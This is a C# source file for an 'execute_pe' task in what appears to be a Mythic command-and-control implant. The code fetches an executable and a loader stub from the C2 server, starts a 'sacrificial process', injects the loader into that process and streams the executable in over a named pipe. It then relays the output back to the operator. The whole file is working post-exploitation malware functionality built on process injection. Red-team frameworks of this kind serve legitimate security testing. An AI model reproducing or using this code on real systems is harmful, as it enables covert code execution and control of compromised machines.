#define COMMAND_NAME_UPPER

#if DEBUG
#define EXECUTE_PE
#endif

#if EXECUTE_PE

using System;
using System.Text;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using PhantomInterop.Serializers;
using System.Threading;
using System.Collections.Concurrent;
using System.IO.Pipes;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Classes.Core;
using PhantomInterop.Utils;
using System.Threading.Tasks;
using PhantomInterop.Classes.Events;
using System.ComponentModel;
using PhantomInterop.Classes.Collections;
using System.Linq;

namespace Tasks
{
    public class execute_pe : Tasking
    {

#pragma warning disable 0649
        [DataContract]
        internal struct ExecutePEParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "pe_name")]
            public string PEName;
            [DataMember(Name = "commandline")]
            public string CommandLine;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pe_id")]
            public string PeId;
        }
#pragma warning restore 0649

        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private JsonHandler _serializer = new JsonHandler();
        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
        private Action<object> _transmitAction;

        private Action<object> _flushData;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
        private bool _isFinished = false;
        private System.Threading.Tasks.Task flushTask;
        public execute_pe(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _transmitAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_stopToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _msgSendEvent,
                    _stopToken.Token.WaitHandle
                    });
                    if (!_stopToken.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
                    {
                        try
                        {
                            ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, p);
                        }
                        catch
                        {
                            ps.Close();
                            _taskComplete.Set();
                            return;
                        }

                    }
                    else if (!ps.IsConnected)
                    {
                        ps.Close();
                        _taskComplete.Set();
                        return;
                    }
                }
                ps.Close();
                _taskComplete.Set();
            };

            _flushData = (object p) =>
            {
                string output = "";
                while (!_stopToken.IsCancellationRequested && !_isFinished)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        _taskComplete,
                        _stopToken.Token.WaitHandle
                    }, 2000);
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                }
                while (true)
                {
                    System.Threading.Tasks.Task.Delay(1000).Wait(); 
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                    else
                    {
                        DebugHelp.DebugWriteLine($"no longer collecting output");
                        return;
                    }
                }

            };
        }

        public override void Kill()
        {
            _isFinished = true;
            _taskComplete.Set();
            flushTask.Wait();
            _stopToken.Cancel();
        }


        public override void Start()
        {
            MythicTaskResponse resp;
            Process? proc = null;
            try
            {
                ExecutePEParameters parameters = _dataSerializer.Deserialize<ExecutePEParameters>(_data.Parameters);

                DebugHelp.DebugWriteLine("Starting execute_pe task");
                DebugHelp.DebugWriteLine($"Task Parameters: {_data.Parameters}");
                DebugHelp.DebugWriteLine($"Executable name: {parameters.PEName}");
                DebugHelp.DebugWriteLine($"Process command line: {parameters.CommandLine}");

                if (string.IsNullOrEmpty(parameters.LoaderStubId) || string.IsNullOrEmpty(parameters.PEName) || string.IsNullOrEmpty(parameters.PipeName))
                {
                    throw new ArgumentNullException($"One or more required arguments was not provided.");
                }

                byte[]? peBytes;

                if (!string.IsNullOrEmpty(parameters.PeId))
                {
                    if (!_agent.GetFileManager().GetFileFromStore(parameters.PeId, out peBytes))
                    {
                        if (_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.PeId, out peBytes))
                        {
                            _agent.GetFileManager().AddFileToStore(parameters.PeId, peBytes);
                        }
                    }
                }
                else
                {
                    _agent.GetFileManager().GetFileFromStore(parameters.PEName, out peBytes);
                }

                peBytes = peBytes ?? throw new InvalidOperationException($"${parameters.PEName} is not loaded (have you registered it?)");
                if (peBytes.Length == 0)
                {
                    throw new InvalidOperationException($"{parameters.PEName} has a zero length (have you registered it?)");
                }

                if (!_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId, out byte[] exePEPic))
                {
                    throw new InvalidOperationException($"Failed to download assembly loader stub (with id: {parameters.LoaderStubId}");
                }

                ApplicationStartupInfo info = _agent.GetProcessManager().GetStartupInfo(IntPtr.Size == 8);

                proc = _agent.GetProcessManager()
                    .NewProcess(
                        info.Application,
                        info.Arguments,
                        true
                    ) ?? throw new InvalidOperationException($"Process manager failed to create a new process {info.Application}");

                
                
                

                if (!proc.Start())
                {
                    throw new InvalidOperationException($"Failed to start sacrificial process {info.Application}");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessCreate((int)proc.PID, info.Application, info.Arguments)
                        ]
                    )
                );

                if (!proc.Inject(exePEPic))
                {
                    throw new Exception($"Failed to inject loader into sacrificial process {info.Application}.");
                }

                _agent.GetTaskManager().AddTaskResponseToQueue(
                    CreateTaskResponse("", false, messages:
                        [
                            Artifact.ProcessInject((int)proc.PID, _agent.GetInjectionManager().GetCurrentTechnique().Name)
                        ]
                    )
                );

                var cmdargs = new ExecutePEIPCMessage()
                {
                    Executable = peBytes,
                    ImageName = parameters.PEName,
                    CommandLine = parameters.CommandLine,
                };

                var client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                client.ConnectionEstablished += OnConnectionReady;
                client.MessageReceived += Client_MessageReceived;
                client.Disconnect += Client_Disconnet;

                if (!client.Connect(10000))
                {
                    throw new Exception($"Injected assembly into sacrificial process: {info.Application}.\n Failed to connect to named pipe: {parameters.PipeName}.");
                }

                DataChunk[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                foreach (DataChunk chunk in chunks)
                {
                    _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                }

                _msgSendEvent.Set();
                DebugHelp.DebugWriteLine("waiting for cancellation token in execute_pe.cs");
                WaitHandle.WaitAny(
                [
                    _stopToken.Token.WaitHandle,
                ]);
                DebugHelp.DebugWriteLine("cancellation token activated in execute_pe.cs, returning completed");
                resp = CreateTaskResponse("", true, "completed");
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected Error\n{ex.Message}\n\nStack trace: {ex.StackTrace}", true, "error");
                _stopToken.Cancel();
            }

            if (proc is Process procHandle)
            {
                if (!procHandle.HasExited)
                {
                    procHandle.Kill();
                    resp.Artifacts = [Artifact.ProcessKill((int)procHandle.PID)];
                }

                if (procHandle.ExitCode != 0)
                {
                    if ((procHandle.ExitCode & 0xc0000000) != 0
                        && procHandle.GetExitCodeHResult() is int exitCodeHResult)
                    {
                        var errorMessage = new Win32Exception(exitCodeHResult).Message;
                        resp.UserOutput += $"\n[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x} - {errorMessage}";
                        resp.Status = "error";
                    }
                    else
                    {
                        resp.UserOutput += $"\n[*] Process exited with code: {procHandle.ExitCode} - 0x{(uint)procHandle.ExitCode:x}";
                    }
                } else
                {
                    resp.UserOutput += $"\n[*] Process exited with code: 0x{(uint)procHandle.ExitCode:x}";
                }
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void Client_Disconnet(object sender, PipeMessageData e)
        {
            _isFinished = true;
            _taskComplete.Set();
            flushTask.Wait();
            e.Pipe.Close();
            _stopToken.Cancel();
        }

        private void OnConnectionReady(object sender, PipeMessageData e)
        {
            Task.Factory.StartNew(_transmitAction, e.Pipe, _stopToken.Token);
            flushTask = Task.Factory.StartNew(_flushData, _stopToken.Token);
        }

        public void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            
            if (pipe.IsConnected && !_stopToken.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] data))
            {
                try
                {
                    pipe.EndWrite(result);
                    pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
                }
                catch
                {

                }

            }
        }
        private void Client_MessageReceived(object sender, PipeMessageData e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            DebugHelp.DebugWriteLine($"adding data to output");
            _assemblyOutput.Add(msg);
        }
    }
}
#endif
